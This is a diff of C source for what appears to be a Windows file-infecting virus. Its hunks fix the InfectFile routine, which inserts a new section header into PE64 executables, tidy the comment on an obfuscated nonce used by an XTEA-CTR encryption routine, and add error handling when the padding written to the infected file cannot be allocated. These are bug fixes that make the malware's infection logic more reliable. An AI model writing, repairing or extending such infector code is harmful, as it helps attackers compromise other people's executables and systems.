@@ -249,7 +249,7 @@ static void XteaEncryptBlock(uint32_t v[2], const uint32_t key[4]) {
  * \brief Encrypt/decrypt a buffer using XTEA in CTR mode.
  */
 static void XteaCryptCtr(BYTE* data, size_t len) {
-    static const uint64_t nonce = 0x6E6F6E6365596859ULL; // "YhYecnon" (obfuscated)
+    static const uint64_t nonce = 0x6E6F6E6365596859ULL; // obfuscated nonce
     uint32_t key[4];
     DeriveKey(key);
 
@@ -1120,14 +1120,14 @@ static BOOL InfectFile(const char* path, BOOL useSection) {
     }
 
     DWORD headerEnd = dos.e_lfanew + offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + optSize +
-        (nsec * sizeof(*secs));
+        ((nsec + 1) * sizeof(*secs));
     DWORD firstSectionOffset = secs[0].PointerToRawData;
     for (WORD i = 1; i < nsec; i++) {
         if (secs[i].PointerToRawData < firstSectionOffset) {
             firstSectionOffset = secs[i].PointerToRawData;
         }
     }
-    if (firstSectionOffset < headerEnd + sizeof(IMAGE_SECTION_HEADER)) {
+    if (firstSectionOffset < headerEnd) {
         printf("[ERROR] Not enough header slack to add section header\n");
         free(fileData);
         free(secs);
@@ -1165,11 +1165,16 @@ static BOOL InfectFile(const char* path, BOOL useSection) {
     if (newPtr > fileEnd) {
         DWORD pad = newPtr - fileEnd;
         BYTE* zero = calloc(pad, 1);
-        if (zero) {
-            SetFilePointer(hFile, 0, NULL, FILE_END);
-            WriteFile(hFile, zero, pad, &rd, NULL);
-            free(zero);
+        if (!zero) {
+            printf("[ERROR] calloc failed\n");
+            free(fileData);
+            free(secs);
+            CloseHandle(hFile);
+            return FALSE;
         }
+        SetFilePointer(hFile, 0, NULL, FILE_END);
+        WriteFile(hFile, zero, pad, &rd, NULL);
+        free(zero);
     }
 
     SetFilePointer(hFile, newPtr, NULL, FILE_BEGIN);
